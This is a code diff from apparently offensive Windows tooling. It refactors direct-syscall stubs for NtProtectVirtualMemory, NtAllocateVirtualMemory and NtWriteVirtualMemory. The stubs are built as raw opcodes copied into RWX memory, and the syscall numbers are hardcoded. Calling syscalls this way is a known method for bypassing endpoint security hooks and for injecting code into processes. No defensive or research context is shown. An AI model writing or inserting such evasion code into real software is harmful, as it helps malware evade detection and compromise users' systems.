@@ -30,9 +30,29 @@
  *   C3                ret
  */
 
-typedef NTSTATUS (WINAPI *syscall_stub_t)(...);
+typedef NTSTATUS (WINAPI *NtProtectVirtualMemory_t)(
+    HANDLE ProcessHandle,
+    PVOID *BaseAddress,
+    SIZE_T *NumberOfBytesToProtect,
+    ULONG NewAccessProtection,
+    PULONG OldAccessProtection);
 
-static syscall_stub_t create_syscall_stub(DWORD syscall_num) {
+typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(
+    HANDLE ProcessHandle,
+    PVOID *BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect);
+
+typedef NTSTATUS (WINAPI *NtWriteVirtualMemory_t)(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    SIZE_T NumberOfBytesToWrite,
+    PSIZE_T NumberOfBytesWritten);
+
+static void* create_syscall_stub(DWORD syscall_num) {
     unsigned char stub[] = {
         0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
         0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, syscall_num */
@@ -45,7 +65,7 @@ static syscall_stub_t create_syscall_stub(DWORD syscall_num) {
     void *mem = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!mem) return NULL;
     memcpy(mem, stub, sizeof(stub));
-    return (syscall_stub_t)mem;
+    return mem;
 }
 
 /* Syscall numbers for Windows 10/11 x64 (Win10 20H2+ / Win11) */
@@ -53,14 +73,14 @@ static syscall_stub_t create_syscall_stub(DWORD syscall_num) {
 #define SYSCALL_NtAllocateVirtualMemory 0x18
 #define SYSCALL_NtWriteVirtualMemory    0x3A
 
-static syscall_stub_t g_scProtect = NULL;
-static syscall_stub_t g_scAllocate = NULL;
-static syscall_stub_t g_scWrite = NULL;
+static NtProtectVirtualMemory_t  g_scProtect = NULL;
+static NtAllocateVirtualMemory_t g_scAllocate = NULL;
+static NtWriteVirtualMemory_t    g_scWrite = NULL;
 
 static void init_syscalls(void) {
-    if (!g_scProtect)  g_scProtect  = create_syscall_stub(SYSCALL_NtProtectVirtualMemory);
-    if (!g_scAllocate) g_scAllocate = create_syscall_stub(SYSCALL_NtAllocateVirtualMemory);
-    if (!g_scWrite)    g_scWrite    = create_syscall_stub(SYSCALL_NtWriteVirtualMemory);
+    if (!g_scProtect)  g_scProtect  = (NtProtectVirtualMemory_t)create_syscall_stub(SYSCALL_NtProtectVirtualMemory);
+    if (!g_scAllocate) g_scAllocate = (NtAllocateVirtualMemory_t)create_syscall_stub(SYSCALL_NtAllocateVirtualMemory);
+    if (!g_scWrite)    g_scWrite    = (NtWriteVirtualMemory_t)create_syscall_stub(SYSCALL_NtWriteVirtualMemory);
 }
 
 /* Wrapper: NtProtectVirtualMemory via direct syscall */
